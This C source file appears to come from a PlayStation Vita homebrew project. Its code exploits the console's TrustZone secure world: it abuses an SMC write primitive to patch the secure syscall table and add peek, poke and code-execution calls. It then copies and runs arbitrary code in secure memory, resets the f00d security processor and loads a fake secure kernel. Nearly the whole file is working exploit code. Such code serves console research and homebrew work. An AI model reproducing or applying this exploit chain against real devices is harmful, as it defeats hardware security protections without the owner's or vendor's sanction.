/*
 * Copyright (C) 2021 skgleba
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#define SMC_PEEK				0x180
#define SMC_POKE				0x181
#define SMC_DACROFF_MEMCPY		0x182
#define SMC_FLUSH				0x183
#define SMC_CCODE		        0x184

#define TZ_RXMEM 0xD2738
#define TZ_SHARED 0xBC000
#define TZ_SYSCALL 0xAE000
#define TZ_PEEK 0xC44F5
#define TZ_POKE 0xD4E34
#define TZ_DACROFF_MEMCPY 0xD519D
#define TZ_FLUSH 0xD7A09
#define K_SHARED 0x96000
#define TZ_MMU 0x8000
#define TZ_VA 0x38000000

#define TZ_WRITE32(addr, data) xsmc(addr, data, 0, 0, SMC_POKE)
#define TZ_READ32(addr) xsmc(0, 0, 0, addr, SMC_PEEK)
#define TZ_CCACHE(addr, len) xsmc(addr, len, 0, 0, SMC_FLUSH)

// use the write primitive to add read32 and write32 smcs
static int patch_tz_peekpoke(k_root* kroot) {
    void (*dcl2wbivr)(void* va, uint32_t sz) = KFUN("SceSysmem", 0x28a00 | 1);
    if (!dcl2wbivr)
        return -1;
    unsigned int* shared_mem = (unsigned int*)(K_SHARED);
    unsigned int handle;
    unsigned int ret, i;
    unsigned int index;
    unsigned int smc_id = 0x180;
    unsigned int tz_shared_mem = TZ_SHARED;
    unsigned int tz_syscall_table = TZ_SYSCALL;
    unsigned int tz_target_write_address = tz_syscall_table + ((smc_id - 0x100) * 4);
    kroot->memset(shared_mem, 0, 0x5000);

    shared_mem[0x28 / 4] = TZ_PEEK; // PEEK function 
    shared_mem[0x2C / 4] = TZ_POKE; // POKE function
    handle = tz_shared_mem;
    handle >>= 1;

    index = (tz_target_write_address - tz_shared_mem) >> 7;
    dcl2wbivr(shared_mem, 0x5000);
    __asm ("dmb sy");
    __asm ("dsb sy");
    ret = xsmc(handle, index, 0, 0, 0x12F);
    __asm ("dsb sy");
    __asm ("dmb sy");

    return ret;
}

// hack tz, add custom smcs
int tz_init(k_root* kroot) {
    if (!kroot)
        return -1;
    
    kroot->printf("[SNS][TZ] tz_init, adding peek/poke\n");
    
    int ret = patch_tz_peekpoke(kroot);
    kroot->printf("[SNS][TZ] patch_tz_peekpoke() 0x%X\n", ret);
    if (ret < 0)
        return ret;

    kroot->printf("[SNS][TZ] making new SMCs\n");
    TZ_WRITE32(TZ_SYSCALL + ((SMC_FLUSH - 0x100) * 4), TZ_FLUSH);
    TZ_WRITE32(TZ_SYSCALL + ((SMC_DACROFF_MEMCPY - 0x100) * 4), TZ_DACROFF_MEMCPY | 1);
    TZ_WRITE32(TZ_SYSCALL + ((SMC_CCODE - 0x100) * 4), TZ_RXMEM | 1);
    TZ_CCACHE(TZ_SYSCALL + ((SMC_PEEK - 0x100) * 4), 0x100);

    return 0;
}

int tz_dacroff_copyto(k_root* kroot, uint32_t tz_va_dst, void* ns_va_src, uint32_t sz) {
    void (*dcl2wbivr)(void* va, uint32_t sz) = KFUN("SceSysmem", 0x28a00 | 1);
    if (!dcl2wbivr)
        return -1;
    if (sz > 0x3000)
        return -2;
    void* tzns_cpybuf = (void*)K_SHARED;
    kroot->memset(tzns_cpybuf, 0, sz);
    kroot->memcpy(tzns_cpybuf, ns_va_src, sz);

    dcl2wbivr(tzns_cpybuf, 0x3000); // dafuk
    __asm ("dmb sy");
    __asm ("dsb sy");
    int ret = xsmc(tz_va_dst, TZ_SHARED, sz, 0, SMC_DACROFF_MEMCPY);
    __asm ("dsb sy");
    __asm ("dmb sy");

    return ret;
}

int tz_run(k_root* kroot, void* code, uint32_t size, int a0, int a1, int a2, int a3) {
    if (!kroot || !code)
        return -1;

    kroot->printf("[SNS][TZ] tz_run_code, copying the code to rx tz mem\n");
    int ret = tz_dacroff_copyto(kroot, TZ_RXMEM, code, size);
    if (ret < 0)
        return ret;
    
    kroot->printf("[SNS][TZ] calling the tz code with smc\n");
    return xsmc(a0, a1, a2, a3, SMC_CCODE);
}

int tz_load_fake_sk(k_root* kroot, uint32_t paddr, uint32_t reset) {
    if (!kroot)
        return -1;
    kroot->printf("[SNS][TZ] load_sk(0x%08X), disabling cry2arm0 intr\n", paddr);
    xsmc(0x000a3e88, 0, 0, 0, SMC_POKE);

    kroot->printf("[SNS][TZ] load_sk(0x%08X), disabling SECOND cry2arm0 intr\n", paddr);
    xsmc(0x00203f00, 0, 0, 0, SMC_POKE);

    kroot->printf("[SNS][TZ] performing f00d reset\n");
    TZ_WRITE32(0xE0010000 | reset, 1);
    TZ_WRITE32(0xE0010000 | reset, 0);
    while (TZ_READ32(0xE0010000 | reset)) {}
    int ret = 0;
    while (ret >= 0) {
        ret = TZ_READ32(0xE0010004);
    }

    kroot->printf("[SNS][TZ] did reset to mode 0x%08X, preparing the fake sk\n", ret);
    ret = brom_init(kroot);
    if (ret < 0)
        return -2;

    kroot->printf("[SNS][TZ] loading secure_kernel.enp from 0x%08X\n", paddr);
    TZ_WRITE32(0xE0000010, paddr | 1);
    ret = 0;
    while (ret != 1) {
        ret = TZ_READ32(0xE0000000);
        if (ret == 2)
            break;
    }
    TZ_WRITE32(0xE0000000, ret);
    
    kroot->printf("[SNS][TZ] load_secure_kernel ret 0x%X\n", ret);
    if (ret != 1)
        return -3;
    return 0;
}